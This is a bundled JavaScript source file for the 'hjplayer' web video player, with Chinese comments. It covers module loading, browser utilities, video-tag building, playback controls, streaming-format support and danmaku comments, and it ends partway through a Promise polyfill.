"use strict";
(function(global, factory) {
	// 1. 兼容 CommonJS 环境（Node.js，module.exports 存在）
	if (typeof exports === 'object' && typeof module === 'object') {
		module.exports = factory();
	}
	// 2. 兼容 AMD 环境（RequireJS 等，define.amd 存在）
	else if (typeof define === 'function' && define.amd) {
		define("hjplayer", [], factory);
	}
	// 3. 兼容 CommonJS 简化环境（仅 exports 存在，无 module）
	else if (typeof exports === 'object') {
		exports.hjplayer = factory();
	}
	// 4. 兼容浏览器全局环境（挂载到 global 上，浏览器中 global 即 window）
	else {
		global.hjplayer = factory();
	}
})
(typeof self !== 'undefined' ? self : this, function() {
	// 模块加载器核心函数
	return function(moduleMap) {
			// 模块缓存对象：存储已加载的模块，避免重复执行
			const moduleCache = {};
			// 核心模块加载函数：根据模块ID获取/执行模块
			function requireModule(moduleId) {
				// 若模块已缓存，直接返回缓存的模块导出对象
				if (moduleCache[moduleId]) {
					return moduleCache[moduleId].exports;
				}
				// 初始化模块对象，存入缓存
				const module = moduleCache[moduleId] = {
					id: moduleId, // 模块唯一标识
					loaded: false, // 模块是否已加载完成
					exports: {} // 模块导出内容容器
				};
				// 执行模块函数，绑定模块上下文，传入模块对象、导出对象和加载函数
				moduleMap[moduleId].call(module.exports, module, module.exports, requireModule);
				// 标记模块已加载完成
				module.loaded = true;
				// 返回模块的导出内容
				return module.exports;
			}
			// 扩展 requireModule 的属性和方法（对应原代码的工具方法挂载）
			// 挂载模块映射表（所有待加载的模块集合）
			requireModule.m = moduleMap;
			// 挂载模块缓存对象
			requireModule.c = moduleCache;
			// 定义模块导出属性（带 getter，不可配置、可枚举）
			requireModule.d = function(exportsObj, propName, getterFunc) {
				// 若属性不存在，才进行定义
				if (!requireModule.o(exportsObj, propName)) {
					Object.defineProperty(exportsObj, propName, {
						configurable: false,
						enumerable: true,
						get: getterFunc
					});
				}
			};
			// 处理 ES Module 兼容：获取模块的默认导出或自身
			requireModule.n = function(moduleExports) {
				// 判断是否为 ES Module 模块
				const getModule = moduleExports && moduleExports.__esModule ?
					function() {
						return moduleExports.default;
					} // ES Module 取 default 导出
					:
					function() {
						return moduleExports;
					}; // 普通模块取自身
				// 为获取函数挂载 "a" 属性（指向自身），兼容模块访问
				requireModule.d(getModule, "a", getModule);
				return getModule;
			};
			// 检查对象是否自身拥有指定属性（排除原型链继承属性）
			requireModule.o = function(targetObj, propKey) {
				return Object.prototype.hasOwnProperty.call(targetObj, propKey);
			};
			// 模块公共路径（对应 Webpack 的 publicPath 配置）
			requireModule.p = "/";
			// 执行入口模块（模块ID为5），并返回入口模块的导出内容
			return requireModule((requireModule.s = 5));
		}
		([
			function(e, t, n) {
				// 1. 定义浏览器环境相关判断（提前提取，语义化命名）
				const isMobile = /mobile/i.test(window.navigator.userAgent);
				const isFirefox = /firefox/i.test(window.navigator.userAgent);
				const isChrome = /chrome/i.test(window.navigator.userAgent);
				// 2. 补零工具函数（提取原匿名函数，语义化命名）
				const formatNumber = (num) => {
					return num < 10 ? `0${num}` : `${num}`;
				};
				// 3. 工具对象（核心功能保持不变，优化变量名和代码结构）
				const utils = {
					/**
					 * 秒数转换为时分秒格式（有小时显示: 时:分:秒；无小时显示: 分:秒）
					 * @param {number} seconds - 待转换的秒数
					 * @returns {string} 格式化后的时分秒字符串
					 */
					secondToTime: function(seconds) {
						const hours = Math.floor(seconds / 3600);
						const minutes = Math.floor((seconds - 3600 * hours) / 60);
						const secondsRemain = Math.floor(seconds - 3600 * hours - 60 * minutes);
						// 有小时则返回[时, 分, 秒]，无小时返回[分, 秒]，统一补零并拼接
						const timeSegments = hours > 0 ? [hours, minutes, secondsRemain] : [minutes,
							secondsRemain
						];
						return timeSegments.map(formatNumber).join(":");
					},
					/**
					 * 获取元素相对于视口的左侧偏移量
					 * @param {HTMLElement} element - 目标DOM元素
					 * @returns {number} 左侧偏移量
					 */
					getElementViewLeft: function(element) {
						let leftOffset = element.offsetLeft;
						let offsetParent = element.offsetParent;
						const scrollLeft = document.body.scrollLeft + document.documentElement
							.scrollLeft;
						// 判断是否处于全屏状态（兼容主流浏览器）
						const isFullScreen = !!document.fullscreenElement || !!document
							.mozFullScreenElement || !!document.webkitFullscreenElement;
						// 全屏状态下的偏移量计算
						if (isFullScreen) {
							while (offsetParent !== null && offsetParent !== element) {
								leftOffset += offsetParent.offsetLeft;
								offsetParent = offsetParent.offsetParent;
							}
						}
						// 非全屏状态下的偏移量计算
						else {
							while (offsetParent !== null) {
								leftOffset += offsetParent.offsetLeft;
								offsetParent = offsetParent.offsetParent;
							}
						}
						return leftOffset - scrollLeft;
					},
					/**
					 * 获取当前页面的滚动位置
					 * @returns {Object} 包含left（水平滚动距离）和top（垂直滚动距离）的对象
					 */
					getScrollPosition: function() {
						return {
							left: window.pageXOffset || document.documentElement.scrollLeft || document
								.body.scrollLeft || 0,
							top: window.pageYOffset || document.documentElement.scrollTop || document
								.body.scrollTop || 0
						};
					},
					/**
					 * 设置页面滚动位置
					 * @param {Object} position - 滚动位置配置项
					 * @param {number} [position.left=0] - 水平滚动目标位置
					 * @param {number} [position.top=0] - 垂直滚动目标位置
					 */
					setScrollPosition: function(position) {
						// 优化参数获取，使用默认值替代void 0判断，更直观
						const targetLeft = position.left ?? 0;
						const targetTop = position.top ?? 0;
						// 保留原Firefox兼容逻辑
						if (isFirefox) {
							document.documentElement.scrollLeft = targetLeft;
							document.documentElement.scrollTop = targetTop;
						} else {
							window.scrollTo(targetLeft, targetTop);
						}
					},
					// 浏览器环境标识（保留原属性）
					isMobile,
					isFirefox,
					isChrome,
					// 本地存储工具（简化localStorage操作）
					storage: {
						set: function(key, value) {
							localStorage.setItem(key, value);
						},
						get: function(key) {
							return localStorage.getItem(key);
						}
					},
					/**
					 * 获取元素的累计偏移量（相对于最顶层父元素）
					 * @param {HTMLElement} element - 目标DOM元素
					 * @returns {Object} 包含top（垂直累计偏移）和left（水平累计偏移）的对象
					 */
					cumulativeOffset: function(element) {
						let totalTop = 0;
						let totalLeft = 0;
						let currentElement = element;
						do {
							totalTop += currentElement.offsetTop || 0;
							totalLeft += currentElement.offsetLeft || 0;
							currentElement = currentElement.offsetParent;
						} while (currentElement);
						return {
							top: totalTop,
							left: totalLeft
						};
					},
					// 拖拽事件名映射（移动端/PC端区分）
					nameMap: {
						dragStart: isMobile ? "touchstart" : "mousedown",
						dragMove: isMobile ? "touchmove" : "mousemove",
						dragEnd: isMobile ? "touchend" : "mouseup"
					}
				};
				// 保留原模块导出规范：标记为ES模块，并导出默认值
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				t.default = utils;
			},
			/**
			 * 跨环境获取全局对象（浏览器：window / Node.js：global 等）
			 * @param {object} moduleExports - CommonJS模块的exports对象（对应原代码e）
			 */
			function getGlobalObject(moduleExports, _, __) {
				// 类型判断工具函数：增强版typeof，准确识别Symbol类型
				const typeOf = (() => {
					// 判断环境是否支持Symbol
					const supportsSymbol = typeof Symbol === 'function' && typeof Symbol.iterator ===
						'symbol';
					if (supportsSymbol) {
						return (value) => typeof value;
					} else {
						return (value) => {
							// 兼容不支持Symbol原生typeof判断的环境，手动识别Symbol实例
							return (value && typeof Symbol === 'function' && value.constructor ===
								Symbol && value !== Symbol.prototype) ? 'symbol' : typeof value;
						};
					}
				})();
				// 初始化全局对象
				let globalObj;
				try {
					// 第一步：通过this绑定获取（函数直接执行时this指向全局对象）
					globalObj = (function() {
						return this;
					})();
					// 第二步：备用方案1 - Function构造函数获取全局this（规避严格模式影响）
					if (!globalObj) {
						globalObj = Function("return this")();
					}
					// 第三步：备用方案2 - eval获取全局this
					if (!globalObj) {
						globalObj = (0, eval)("this");
					}
				} catch (error) {
					// 异常降级：若以上方案失败，尝试直接使用window（浏览器环境）
					const windowType = typeof window === 'undefined' ? 'undefined' : typeOf(window);
					if (windowType === 'object') {
						globalObj = window;
					}
				}
				// 导出全局对象（对应原代码e.exports = i）
				moduleExports.exports = globalObj;
			},
			function(e, t, n) {
				// 1. 提取通用的模块兼容处理函数（消除重复定义，统一复用）
				function normalizeModule(module) {
					// 功能与原 i 函数一致：判断是否为 ES Module，非 ES Module 则包装为 default 导出格式
					return module && module.__esModule ? module : {
						default: module
					};
				}
				// 2. 标记当前模块为 ES Module（与原功能一致）
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				// 3. 批量导入并规范化模块（消除重复的变量声明，简洁高效）
				// 按原顺序对应模块 ID 16-31，统一规范化后提取 default 导出
				const modules = [16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31].map(moduleId =>
					normalizeModule(n(moduleId)).default);
				// 4. 构造导出对象 I（与原属性一一对应，保证功能完全一致）
				const I = {
					play: modules[0],
					pause: modules[1],
					volumeUp: modules[2],
					volumeDown: modules[3],
					volumeOff: modules[4],
					full: modules[5],
					fullWeb: modules[6],
					setting: modules[7],
					right: modules[8],
					comment: modules[9],
					commentOff: modules[10],
					send: modules[11],
					pallette: modules[12],
					camera: modules[13],
					subtitle: modules[14],
					loading: modules[15]
				};
				// 5. 导出默认对象（与原功能一致）
				t.default = I;
			},
			function(e, t, n) {
				e.exports = n(33)
			},
			// 构建视频标签字符串的工具函数
			function(e, t, n) {
				// 引入外部模块（转义工具）
				const escapeUtil = n(3);
				// 导出构建视频标签的核心函数
				e.exports = function(videoOptions) {
					// 处理入参默认值，避免 undefined 报错
					videoOptions = videoOptions || {};
					// 解构赋值：从配置对象中提取所需属性，语义化命名
					const {
						enableSubtitle, // 启用字幕（原代码中未实际使用，保留以兼容原功能）
						subtitle, // 字幕配置
						current, // 是否为当前激活的视频
						pic, // 视频封面图地址
						screenshot, // 是否支持截图
						preload, // 预加载配置
						url // 视频资源地址
					} = videoOptions;
					// 缓存转义方法，简化后续调用
					const $escape = escapeUtil.$escape;
					// 判断是否为 webvtt 类型的字幕（覆盖原变量 n 的冗余声明，功能一致）
					const isWebVttSubtitle = subtitle && subtitle.type === "webvtt";
					// 初始化视频标签字符串
					let videoTag = "";
					// 拼接视频标签开始标签及基础 class
					videoTag += '\n<video\n    class="hjplayer-video';
					// 如果是当前视频，追加对应 class
					if (current) {
						videoTag += ' hjplayer-video-current';
					}
					videoTag += '"\n    webkit-playsinline\n    playsinline\n    ';
					// 拼接封面图属性（存在则添加）
					if (pic) {
						videoTag += 'poster="' + $escape(pic) + '"';
					}
					videoTag += "\n    ";
					// 拼接跨域属性（支持截图 或 是 webvtt 字幕 则添加）
					if (screenshot || isWebVttSubtitle) {
						videoTag += 'crossorigin="anonymous"';
					}
					videoTag += "\n    ";
					// 拼接预加载属性（存在则添加）
					if (preload) {
						videoTag += 'preload="' + $escape(preload) + '"';
					}
					videoTag += "\n    ";
					// 拼接视频资源地址（存在则添加）
					if (url) {
						videoTag += 'src="' + $escape(url) + '"';
					}
					videoTag += "\n    >\n    ";
					// 拼接 webvtt 字幕轨道（符合条件则添加）
					if (isWebVttSubtitle) {
						videoTag += '\n    <track kind="metadata" default src="' + $escape(subtitle.url) +
							'"></track>\n    ';
					}
					videoTag += "\n</video>";
					// 返回构建完成的视频标签字符串
					return videoTag;
				};
			},
			/**
			 * 模块入口函数（保持原UMD模块结构，功能与原代码完全一致）
			 * @param {*} e - 模块加载器相关参数（原代码未使用）
			 * @param {Object} t - 模块导出对象
			 * @param {Function} n - 模块导入函数（用于加载依赖模块）
			 */
			function moduleEntry(e, t, n) {
				// 标记当前模块为ES Module规范
				Object.defineProperty(t, "__esModule", {
					value: true
				});
				// 加载依赖模块6（原代码无后续使用，仅执行加载）
				n(6);
				// 加载依赖模块7，并处理非ES Module模块的兼容包装
				const module7 = n(7);
				// 兼容处理：若模块是ES Module则直接使用，否则包装为default导出形式
				const wrappedModule7 = (() => {
					if (module7 && module7.__esModule) {
						return module7;
					}
					return {
						default: module7
					};
				})();
				// 计算并打印页面加载耗时（保留原格式和样式）
				console.log('%c页面加载完毕消耗了' + Math.round(performance.now() * 100) / 100 + 'ms',
					'background:#fff;color:#333;text-shadow:0 0 2px #eee,0 0 3px #eee,0 0 3px #eee,0 0 2px #eee,0 0 3px #eee;'
				);
				// 将包装后的模块7的default导出，赋值给当前模块的default导出
				t.default = wrappedModule7.default;
			},
			function(e, t) {},
			function(e, t, n) {
				function i(e) {
					return e && e.__esModule ? e : {
						default: e
					}
				}

				function a(e, t) {
					if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
				}
				Object.defineProperty(t, "__esModule", {
					value: !0
				});
				var o = function() {
						function e(e, t) {
							for (var n = 0; n < t.length; n++) {
								var i = t[n];
								i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i
									.writable = !0), Object.defineProperty(
									e, i.key, i)
							}
						}
						return function(t, n, i) {
							return n && e(t.prototype, n), i && e(t, i), t
						}
					}(),
					s = n(8),
					r = i(s),
					l = n(0),
					c = i(l),
					u = n(12),
					d = i(u),
					p = n(14),
					h = i(p),
					y = n(15),
					m = i(y),
					f = n(2),
					v = i(f),
					g = n(35),
					b = i(g),
					k = n(36),
					w = i(k),
					x = n(37),
					S = i(x),
					T = n(38),
					L = i(T),
					M = n(39),
					_ = i(M),
					q = n(40),
					E = i(q),
					B = n(41),
					P = i(B),
					C = n(42),
					O = i(C),
					z = n(43),
					F = i(z),
					I = n(45),
					j = i(I),
					D = n(46),
					W = i(D),
					H = n(47),
					A = i(H),
					V = n(48),
					R = i(V),
					X = n(49),
					N = i(X),
					U = n(4),
					$ = i(U),
					Q = 0,
					J = [],
					Y = function() {
						function e(t) {
							var n = this;
							a(this, e), this.options = (0, d.default)(t), this.options.video.quality && (this
									.qualityIndex = this.options.video
									.defaultQuality, this.quality = this.options.video.quality[this.options
										.video.defaultQuality]), this.tran =
								new h.default(this.options.lang).tran, this.events = new w.default, this.user =
								new L.default(this), this.container =
								this.options.container, this.container.classList.add("hjplayer"), this.options
								.danmaku || this.container.classList
								.add("hjplayer-no-danmaku"), this.options.live && this.container.classList.add(
									"hjplayer-live"), c.default.isMobile &&
								this.container.classList.add("hjplayer-mobile"), this.arrow = this.container
								.offsetWidth <= 500, this.arrow &&
								this.container.classList.add("hjplayer-arrow"), this.template = new m.default({
									container: this.container,
									options: this.options,
									index: Q,
									tran: this.tran
								}), this.video = this.template.video, this.bar = new E.default(this.template),
								this.bezel = new O.default(
									this.template.bezel), this.fullScreen = new S.default(this), this
								.controller = new F.default(this), this.options
								.danmaku && (this.danmaku = new b.default({
									container: this.template.danmaku,
									opacity: this.user.get("opacity"),
									callback: function() {
										setTimeout(function() {
											n.template.danmakuLoading.style.display =
												"none", setTimeout(function() {
													document.getElementById(
															'link2-success').style
														.display = "block"
												}, 1 * 1500), n.options.autoplay && n.play()
										}, 0)
									},
									error: function(e) {
										document.getElementById('link2-success').remove(),
											setTimeout(function() {
												document.getElementById('link2-error').style
													.display = "block"
											}, 1 * 1000), n.notice(e)
									},
									apiBackend: this.options.apiBackend,
									borderColor: this.options.theme,
									height: this.arrow ? 24 : 30,
									time: function() {
										return n.video.currentTime
									},
									unlimited: this.user.get("unlimited"),
									api: {
										id: this.options.danmaku.id,
										address: this.options.danmaku.api,
										token: this.options.danmaku.token,
										maximum: this.options.danmaku.maximum,
										addition: this.options.danmaku.addition,
										user: this.options.danmaku.user
									},
									events: this.events
								}), this.comment = new W.default(this)), this.setting = new j.default(this),
								document.addEventListener(
									"click",
									function() {
										n.focus = !1
									}, !0), this.container.addEventListener("click", function() {
									n.focus = !0
								}, !0), this.paused = !0, this.time = new P.default(this), this.hotkey = new A
								.default(this), this.contextmenu =
								new R.default(this), this.initVideo(this.video, this.quality && this.quality
									.type || this.options.video.type),
								this.infoPanel = new N.default(this), !this.danmaku && this.options.autoplay &&
								this.play(), Q++, J.push(this)
						}
						return o(e, [{
							key: "seek",
							value: function(e) {
								e = Math.max(e, 0), this.video.duration && (e = Math.min(e, this
										.video.duration)), this.video.currentTime <
									e ? this.notice(this.tran("FF") + " " + (e - this.video
										.currentTime).toFixed(0) + " " + this.tran("s")) :
									this.video.currentTime > e && this.notice(this.tran("REW") +
										" " + (this.video.currentTime - e).toFixed(
											0) + " " + this.tran("s")), this.video.currentTime =
									e, this.danmaku && this.danmaku.seek(), this.bar.set(
										"played", e / this.video.duration, "width")
							}
						}, {
							key: "play",
							value: function() {
								var e = this;
								if (this.paused = !1, this.video.paused && this.bezel.switch(v
										.default.play), this.template.playButton.innerHTML =
									v.default.pause, r.default.resolve(this.video.play()).catch(
										function() {
											e.pause()
										}).then(function() {}), this.time.enable("loading"),
									this.time.enable("progress"), this.container.classList
									.remove("hjplayer-paused"), this.container.classList.add(
										"hjplayer-playing"), this.danmaku && this.danmaku
									.play(), this.options.mutex)
									for (var t = 0; t < J.length; t++) this !== J[t] && J[t]
										.pause()
							}
						}, {
							key: "pause",
							value: function() {
								this.paused = !0, this.container.classList.remove(
										"hjplayer-loading"), this.video.paused || this.bezel
									.switch(
										v.default.pause), this.ended = !1, this.template
									.playButton.innerHTML = v.default.play, this.video.pause(),
									this.time.disable("loading"), this.time.disable("progress"),
									this.container.classList.remove(
										"hjplayer-playing"), this.container.classList.add(
										"hjplayer-paused"), this.danmaku && this.danmaku
									.pause()
							}
						}, {
							key: "switchVolumeIcon",
							value: function() {
								this.volume() >= .95 ? this.template.volumeIcon.innerHTML = v
									.default.volumeUp : this.volume() > 0 ? this
									.template.volumeIcon.innerHTML = v.default.volumeDown : this
									.template.volumeIcon.innerHTML = v.default.volumeOff
							}
						}, {
							key: "volume",
							value: function(e, t, n) {
								if (e = parseFloat(e), !isNaN(e)) {
									e = Math.max(e, 0), e = Math.min(e, 1), this.bar.set(
										"volume", e, "width");
									var i = (100 * e).toFixed(0) + "%";
									this.template.volumeBarWrapWrap.dataset.balloon = i, t ||
										this.user.set("volume", e), n || this.notice(
											this.tran("Volume") + " " + (100 * e).toFixed(0) +
											"%"), this.video.volume = e, this.video.muted && (
											this.video.muted = !1), this.switchVolumeIcon()
								}
								return this.video.volume
							}
						}, {
							key: "toggle",
							value: function() {
								this.video.paused ? this.play() : this.pause()
							}
						}, {
							key: "on",
							value: function(e, t) {
								this.events.on(e, t)
							}
						}, {
							key: "switchVideo",
							value: function(e, t) {
								this.pause(), this.video.poster = e.pic ? e.pic : "", this.video
									.src = e.url, this.initMSE(this.video, e.type ||
										"auto"), t && (this.template.danmakuLoading.style
										.display = "block", this.bar.set("played", 0, "width"),
										this.bar.set("loaded", 0, "width"), this.template.ptime
										.innerHTML = "00:00", this.template.danmaku.innerHTML =
										"", this.danmaku && this.danmaku.reload({
											id: t.id,
											address: t.api,
											token: t.token,
											maximum: t.maximum,
											addition: t.addition,
											user: t.user
										}))
							}
						}, {
							key: "initMSE",
							value: function(e, t) {
								var n = this;
								if (this.type = t, this.options.video.customType && this.options
									.video.customType[t]) "[object Function]" ===
									Object.prototype.toString.call(this.options.video
										.customType[t]) ? this.options.video.customType[t](this
										.video, this) : console.error("Illegal customType: " +
										t);
								else switch ("auto" === this.type && (/m3u8(#|\?|$)/i.exec(e
											.src) ? this.type = "hls" : /.flv(#|\?|$)/i
										.exec(
											e.src) ? this.type = "flv" : /.mpd(#|\?|$)/i
										.exec(e.src) ? this.type = "dash" : this.type =
										"normal"),
									this.type) {
									case "hls":
										if (Hls)
											if (Hls.isSupported()) {
												var i = new Hls;
												i.loadSource(e.src), i.attachMedia(e)
											} else this.notice(
												"Error: Hls is not supported.");
										else this.notice("Error: Can't find Hls.");
										break;
									case "flv":
										if (flvjs && flvjs.isSupported())
											if (flvjs.isSupported()) {
												var a = flvjs.createPlayer({
													type: "flv",
													url: e.src
												});
												a.attachMediaElement(e), a.load()
											} else this.notice(
												"Error: flvjs is not supported.");
										else this.notice("Error: Can't find flvjs.");
										break;
									case "dash":
										dashjs ? dashjs.MediaPlayer().create().initialize(e,
											e.src, !1) : this.notice(
											"Error: Can't find dashjs.");
										break;
									case "webtorrent":
										if (WebTorrent)
											if (WebTorrent.WEBRTC_SUPPORT) {
												this.container.classList.add(
													"hjplayer-loading");
												var o = new WebTorrent,
													s = e.src;
												o.add(s, function(e) {
													e.files.find(function(e) {
														return e.name
															.endsWith(
																".mp4")
													}).renderTo(n.video, {
														autoplay: n.options
															.autoplay
													}, function() {
														n.container
															.classList
															.remove(
																"hjplayer-loading"
															)
													})
												})
											} else this.notice(
												"Error: Webtorrent is not supported.");
										else this.notice("Error: Can't find Webtorrent.")
								}
							}
						}, {
							key: "initVideo",
							value: function(e, t) {
								var n = this;
								this.initMSE(e, t), this.on("durationchange", function() {
									1 !== e.duration && (n.template.dtime.innerHTML = c
										.default.secondToTime(e.duration))
								}), this.on("progress", function() {
									var t = e.buffered.length ? e.buffered.end(e
										.buffered.length - 1) / e.duration : 0;
									n.bar.set("loaded", t, "width")
								}), this.on("error", function() {
									setTimeout(function() {
										document.getElementById('link3-error')
											.style.display = "block"
									}, 5 * 1000), n.tran && n.notice && (n.type, n
										.notice(n.tran("This video fails to load"),
											-1))
								}), this.ended = !1, this.on("ended", function() {
									n.bar.set("played", 1, "width"), n.setting.loop ? (n
											.seek(0), e.play()) : (n.ended = !0, n
											.pause()), n
										.danmaku && (n.danmaku.danIndex = 0)
								}), this.on("play", function() {
									n.paused && n.play()
								}), this.on("pause", function() {
									n.paused || n.pause()
								});
								for (var i = 0; i < this.events.videoEvents.length; i++) !
									function(t) {
										e.addEventListener(n.events.videoEvents[t], function() {
											n.events.trigger(n.events.videoEvents[t])
										})
									}(i);
								this.volume(this.user.get("volume"), !0, !0), this.options
									.subtitle && (this.subtitle = new _.default(
											this.template.subtitle, this.video, this.options
											.subtitle, this.events), this.user.get(
											"subtitle") ||
										this.subtitle.hide())
							}
						}, {
							key: "switchQuality",
							value: function(e) {
								var t = this;
								if (this.qualityIndex !== e && !this.switchingQuality) {
									this.qualityIndex = e, this.switchingQuality = !0, this
										.quality = this.options.video.quality[e], this.template
										.qualityButton.innerHTML = this.quality.name;
									var n = this.video.paused;
									this.video.pause();
									var i = (0, $.default)({
											current: !1,
											pic: null,
											screenshot: this.options.screenshot,
											preload: "auto",
											url: this.quality.url,
											subtitle: this.options.subtitle
										}),
										a = (new DOMParser).parseFromString(i, "text/html").body
										.firstChild;
									this.template.videoWrap.insertBefore(a, this.template
											.videoWrap.getElementsByTagName("div")[0]), this
										.prevVideo =
										this.video, this.video = a, this.initVideo(this.video,
											this.quality.type || this.options.video.type),
										this.seek(this.prevVideo.currentTime), this.notice(this
											.tran("Switching to") + " " + this.quality.name +
											" " + this.tran("quality"), -1), this.events
										.trigger("quality_start", this.quality), this.on(
											"canplay",
											function() {
												if (t.prevVideo) {
													if (t.video.currentTime !== t.prevVideo
														.currentTime) return void t.seek(t
														.prevVideo.currentTime);
													t.template.videoWrap.removeChild(t
															.prevVideo), t.video.classList.add(
															"hjplayer-video-current"), n ||
														t.video.play(), t.prevVideo = null, t
														.notice(t.tran("Switched to") + " " + t
															.quality.name + " " + t
															.tran("quality")), t
														.switchingQuality = !1, t.events
														.trigger("quality_end")
												}
											})
								}
							}
						}, {
							key: "notice",
							value: function(e) {
								var t = this,
									n = arguments.length > 1 && void 0 !== arguments[1] ?
									arguments[1] : 2e3,
									i = arguments.length > 2 && void 0 !== arguments[2] ?
									arguments[2] : .8;
								this.template.notice.innerHTML = e, this.template.notice.style
									.opacity = i, this.noticeTime &&
									clearTimeout(this.noticeTime), this.events.trigger(
										"notice_show", e), this.noticeTime = setTimeout(
										function() {
											t.template.notice.style.opacity = 0, t.events
												.trigger("notice_hide")
										}, n)
							}
						}, {
							key: "resize",
							value: function() {
								this.danmaku && this.danmaku.resize(), this.events.trigger(
									"resize")
							}
						}, {
							key: "speed",
							value: function(e) {
								this.video.playbackRate = e
							}
						}, {
							key: "destroy",
							value: function() {
								J.splice(J.indexOf(this), 1), this.pause(), this.controller
									.destroy(), this.time.destroy(), this.video.src =
									"", this.container.innerHTML = "", this.events.trigger(
										"destroy");
								for (var e in this) this.hasOwnProperty(e) && "paused" !== e &&
									delete this[e]
							}
						}]), e
					}();
				t.default = Y
			},
			// -----------------------------------------------------------------
			function(exports, module, require) {
				(function(setImmediateFunc) {
					// 空函数，用于 Promise 构造函数的默认占位
					function noop() {}
					/**
					 * 绑定函数执行上下文和参数
					 * @param {Function} fn 要执行的函数
					 * @param {Object} context 函数执行的 this 上下文
					 * @returns {Function} 绑定后的函数
					 */
					function bindFunction(fn, context) {
						return function() {
							return fn.apply(context, arguments);
						};
					}
					/**
					 * Promise 延迟对象（存储 then 方法的回调和对应的 Promise 实例）
					 * @param {Function|null} onFulfilled 成功回调
					 * @param {Function|null} onRejected 失败回调
					 * @param {Promise} promise 对应的 Promise 实例
					 */
					function PromiseDeferred(onFulfilled, onRejected, promise) {
						this.onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : null;
						this.onRejected = typeof onRejected === 'function' ? onRejected : null;
						this.promise = promise;
					}
					/**
					 * 核心 Promise 构造函数
					 * @param {Function} executor 执行器函数，接收 resolve 和 reject 两个参数
					 * @throws {TypeError} 未通过 new 关键字调用或执行器非函数时抛出异常
					 */
					function Promise(executor) {
						// 验证是否通过 new 关键字实例化
						if (!(this instanceof Promise)) {
							throw new TypeError("Promises must be constructed via new");
						}
						// 验证执行器是否为函数
						if (typeof executor !== 'function') {
							throw new TypeError("not a function");
						}
						this._state =
							0; // Promise 状态：0-待定(pending)、1-已完成(fulfilled)、2-已拒绝(rejected)、3-已解析（指向其他 Promise）
						this._handled = false; // 标记 Promise 是否被处理（避免未处理拒绝警告）
						this._value = undefined; // 存储 Promise 的值（成功结果或失败原因）
						this._deferreds = []; // 存储延迟对象（then 回调队列）
						// 执行执行器函数
						executeExecutor(executor, this);
					}
					/**
					 * 处理 Promise 回调（核心调度逻辑）
					 * @param {Promise} promise 源 Promise 实例
					 * @param {PromiseDeferred} deferred 延迟对象
					 */
					function handlePromiseCallback(promise, deferred) {
						// 如果 Promise 状态为 3（已解析指向其他 Promise），则递归获取最终的 Promise
						while (promise._state === 3) {
							promise = promise._value;
						}
						// 若 Promise 仍处于待定状态，将延迟对象加入回调队列
						if (promise._state === 0) {
							promise._deferreds.push(deferred);
							return;
						}
						// 标记 Promise 已被处理
						promise._handled = true;
						// 异步执行回调函数
						Promise._immediateFn(function() {
							const callback = promise._state === 1 ? deferred.onFulfilled : deferred
								.onRejected;
							// 若对应状态的回调不存在，直接透传值到下一个 Promise
							if (callback === null) {
								return promise._state === 1 ?
									resolvePromise(deferred.promise, promise._value) :
									rejectPromise(deferred.promise, promise._value);
							}
							let callbackResult;
							try {
								// 执行回调并获取结果
								callbackResult = callback(promise._value);
							} catch (error) {
								// 回调执行出错，拒绝下一个 Promise
								return rejectPromise(deferred.promise, error);
							}
							// 用回调结果解析下一个 Promise
							resolvePromise(deferred.promise, callbackResult);
						});
					}
					/**
					 * 解析 Promise（将 Promise 状态改为已完成）
					 * @param {Promise} promise 要解析的 Promise 实例
					 * @param {*} value 解析值
					 */
					function resolvePromise(promise, value) {
						try {
							// 禁止 Promise 解析自身（避免循环引用）
							if (value === promise) {
								throw new TypeError("A promise cannot be resolved with itself.");
							}
							// 若解析值是对象或函数，尝试获取 then 方法（兼容 thenable 对象）
							if (value && (typeof value === 'object' || typeof value === 'function')) {
								const thenMethod = value.then;
								// 若当前值是 Promise 实例，将当前 Promise 指向该 Promise
								if (value instanceof Promise) {
									promise._state = 3;
									promise._value = value;
									flushPromiseCallbacks(promise);
									return;
								}
								// 若 then 是函数，绑定 then 方法并执行（兼容自定义 thenable）
								if (typeof thenMethod === 'function') {
									executeExecutor(bindFunction(thenMethod, value), promise);
									return;
								}
							}
							// 普通值，直接将 Promise 置为已完成状态
							promise._state = 1;
							promise._value = value;
							flushPromiseCallbacks(promise);
						} catch (error) {
							// 解析过程出错，拒绝当前 Promise
							rejectPromise(promise, error);
						}
					}
					/**
					 * 拒绝 Promise（将 Promise 状态改为已拒绝）
					 * @param {Promise} promise 要拒绝的 Promise 实例
					 * @param {*} reason 拒绝原因
					 */
					function rejectPromise(promise, reason) {
						promise._state = 2;
						promise._value = reason;
						flushPromiseCallbacks(promise);
					}
					/**
					 * 刷新 Promise 回调队列（执行所有延迟对象的回调）
					 * @param {Promise} promise Promise 实例
					 */
					function flushPromiseCallbacks(promise) {
						// 若 Promise 被拒绝且无回调处理，触发未处理拒绝警告
						if (promise._state === 2 && promise._deferreds.length === 0) {
							Promise._immediateFn(function() {
								if (!promise._handled) {
									Promise._unhandledRejectionFn(promise._value);
								}
							});
						}
						// 执行所有延迟对象的回调
						for (let i = 0, len = promise._deferreds.length; i < len; i++) {
							handlePromiseCallback(promise, promise._deferreds[i]);
						}
						// 清空回调队列
						promise._deferreds = null;
					}
					/**
					 * 执行 Promise 执行器函数
					 * @param {Function} executor 执行器函数
					 * @param {Promise} promise 对应的 Promise 实例
					 */
					function executeExecutor(executor, promise) {
						let isExecuted = false; // 标记执行器是否已执行（避免 resolve/reject 多次调用）
						try {
							executor(
								// resolve 回调
								function(value) {
									if (!isExecuted) {
										isExecuted = true;
										resolvePromise(promise, value);
									}
								},
								// reject 回调
								function(reason) {
									if (!isExecuted) {
										isExecuted = true;
										rejectPromise(promise, reason);
									}
								}
							);
						} catch (error) {
							// 执行器执行出错，若未执行过则拒绝 Promise
							if (!isExecuted) {
								isExecuted = true;
								rejectPromise(promise, error);
							}
						}
					}
					/**
					 * 获取值的准确类型（兼容 Symbol 类型）
					 * @param {*} value 要检测的值
					 * @returns {string} 值的类型
					 */
					function getValueType(value) {
						if (typeof Symbol === 'function' && typeof Symbol.iterator === 'symbol') {
							return typeof value;
						}
						return value && typeof Symbol === 'function' && value.constructor === Symbol &&
							value !== Symbol.prototype ?
							'symbol' :
							typeof value;
					}
					// 默认异步执行函数（setTimeout）
